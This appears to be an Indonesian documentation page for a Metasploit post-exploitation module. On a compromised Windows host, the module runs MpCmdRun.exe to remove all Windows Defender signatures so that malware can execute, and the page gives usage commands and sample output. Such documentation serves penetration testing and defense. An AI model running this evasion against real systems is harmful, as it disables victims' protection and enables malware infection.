# rollback_defender_signatures

Modul ini, dengan hak akses yang sesuai, menggunakan utilitas baris perintah Windows Defender (`mpcmdrun.exe`) untuk menjalankan alat otomatisasi guna menonaktifkan semua tanda tangan yang tersedia dan terpasang di mesin yang telah disusupi. Alat ini umumnya digunakan untuk menjadwalkan pemindaian dan memperbarui file tanda tangan atau definisi, tetapi terdapat opsi yang memungkinkan untuk mengembalikan definisi tanda tangan yang terpasang ke salinan cadangan sebelumnya atau ke set tanda tangan default asli, yaitu tidak ada, sehingga menonaktifkan semua tanda tangan dan memungkinkan malware untuk dieksekusi meskipun solusi Windows Defender diaktifkan.

## Penulis
- metasploit metasploit@@csiete.org
- luisco100 luisco100@gmail.com

## Platform
- `Windows`

## Cara Penggunaan di Metasploit

```
use post/windows/manage/rollback_defender_signatures
set SESSION <ID>
set VERBOSE true
rollback
```

Hasil output-nya seperti ini:

```
[*] program_path = C:\Program Files
[*] file_path = C:\Program Files\Windows Defender\MpCmdRun.exe
[*] Removing all definitions for Windows Defender
[*] Running cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
[*] 
Service Version: 6.1.7600.16385
Engine Version: 1.1.6402.0
AntiSpyware Signature Version: 1.95.191.0

Starting engine and signature rollback to none...Done!
[*] Post module execution completed
```

## Referensi
- [Rapid7](https://www.rapid7.com/db/modules/post/windows/manage/rollback_defender_signatures/)
